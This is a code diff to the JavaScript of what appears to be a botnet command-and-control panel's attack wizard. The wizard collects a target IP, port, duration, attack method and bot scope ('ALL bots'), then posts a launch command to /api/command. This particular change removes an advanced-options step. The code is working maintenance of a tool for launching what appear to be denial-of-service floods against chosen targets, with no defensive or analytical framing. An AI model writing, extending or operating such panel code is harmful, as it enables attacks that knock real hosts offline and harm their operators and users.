@@ -2613,23 +2613,15 @@ function wizardNext() {
     var t = document.getElementById('wiz-target').value.trim();
     if (!t) { showToast('Enter a target IP', false); return; }
   }
-  if (wizState.step === 3) {
-    wizState.options = {};
-    var c = document.getElementById('wiz-options-container');
-    if (c) c.querySelectorAll('input[data-key]').forEach(function(el) {
-      if (el.value && el.value !== el.getAttribute('data-default')) wizState.options[el.getAttribute('data-key')] = el.value;
-    });
-  }
-  wizState.step = Math.min(wizState.step + 1, 4);
+  wizState.step = Math.min(wizState.step + 1, 3);
   renderWizStep();
-  if (wizState.step === 3) renderWizOpts();
-  if (wizState.step === 4) renderWizReview();
+  if (wizState.step === 3) renderWizReview();
 }
 
 function wizardBack() { wizState.step = Math.max(wizState.step - 1, 1); renderWizStep(); }
 
 function renderWizStep() {
-  for (var i = 1; i <= 4; i++) {
+  for (var i = 1; i <= 3; i++) {
     var p = document.getElementById('wiz-step-' + i);
     if (p) p.classList.toggle('active', i === wizState.step);
   }
@@ -2640,21 +2632,8 @@ function renderWizStep() {
   });
   var b = document.getElementById('wiz-back'), n = document.getElementById('wiz-next'), l = document.getElementById('wiz-launch');
   if (b) b.style.display = wizState.step > 1 ? '' : 'none';
-  if (n) n.style.display = wizState.step < 4 ? '' : 'none';
-  if (l) l.style.display = wizState.step === 4 ? '' : 'none';
-}
-
-function renderWizOpts() {
-  var c = document.getElementById('wiz-options-container');
-  if (!c || !wizState.method) return;
-  var opts = wizState.method.options || [];
-  if (!opts.length) { c.innerHTML = '<div style="color:var(--text-dim);padding:12px">No advanced options for this method</div>'; return; }
-  c.innerHTML = '<p style="color:var(--text-dim);font-size:13px;margin-bottom:12px">Options for ' + escHtml(wizState.method.name) + ':</p>';
-  opts.forEach(function(o) {
-    var row = document.createElement('div'); row.className = 'wiz-form-row';
-    row.innerHTML = '<label>' + escHtml(o.label) + '</label><input type="text" data-key="' + escHtml(o.key) + '" data-default="' + escHtml(o['default']||'') + '" value="' + escHtml(o['default']||'') + '" placeholder="' + escHtml(o.tooltip||'') + '">';
-    c.appendChild(row);
-  });
+  if (n) n.style.display = wizState.step < 3 ? '' : 'none';
+  if (l) l.style.display = wizState.step === 3 ? '' : 'none';
 }
 
 function renderWizReview() {
@@ -2667,9 +2646,6 @@ function renderWizReview() {
     '<div class="wr-row"><span class="wr-label">Target</span><span class="wr-value">' + escHtml(target) + ':' + escHtml(port) + '</span></div>' +
     '<div class="wr-row"><span class="wr-label">Duration</span><span class="wr-value">' + dur + 's</span></div>' +
     '<div class="wr-row"><span class="wr-label">Scope</span><span class="wr-value">' + (bot || 'ALL bots') + '</span></div>';
-  var ok = wizState.options || {};
-  var keys = Object.keys(ok);
-  if (keys.length) html += '<div class="wr-row"><span class="wr-label">Options</span><span class="wr-value">' + keys.map(function(k) { return k+'='+ok[k]; }).join(', ') + '</span></div>';
   r.innerHTML = html;
 }
 
@@ -2679,8 +2655,6 @@ function wizardLaunch() {
   var dur = document.getElementById('wiz-duration-val').value || '120';
   var bot = (document.getElementById('wiz-bot-target') || {}).value || '';
   var cmd = '!' + wizState.method.id + ' ' + target + ' ' + port + ' ' + dur;
-  var opts = wizState.options || {};
-  Object.keys(opts).forEach(function(k) { cmd += ' ' + k + '=' + opts[k]; });
   fetch('/api/command', {
     method: 'POST', headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ command: cmd, botID: bot })
